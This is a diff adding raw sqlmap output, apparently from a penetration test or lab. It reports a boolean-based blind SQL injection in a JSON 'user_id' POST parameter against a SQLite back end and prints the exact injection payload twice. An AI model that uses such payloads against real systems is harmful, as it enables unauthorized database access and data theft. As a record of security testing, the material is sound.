@@ -1,0 +1,16 @@
+sqlmap identified the following injection point(s) with a total of 1823 HTTP(s) requests:
+---
+Parameter: JSON user_id ((custom) POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
+    Payload: {"user_id": "1 AND CASE WHEN 6288=6288 THEN 6288 ELSE JSON(CHAR(122,84,77,72)) END", "product_id": "1", "quantity": "1"}
+---
+back-end DBMS: SQLite
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON user_id ((custom) POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
+    Payload: {"user_id": "1 AND CASE WHEN 6288=6288 THEN 6288 ELSE JSON(CHAR(122,84,77,72)) END", "product_id": "1", "quantity": "1"}
+---
+back-end DBMS: SQLite
